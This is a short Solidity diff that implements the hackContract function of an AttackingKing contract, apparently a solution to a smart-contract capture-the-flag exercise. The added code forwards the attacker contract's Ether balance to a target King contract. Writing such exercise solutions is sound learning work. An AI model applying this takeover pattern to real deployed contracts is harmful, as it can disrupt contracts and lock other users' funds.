@@ -11,6 +11,8 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        address payable kingContractAddress = payable(contractAddress);
+        (bool sent, ) = kingContractAddress.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
     }
 }
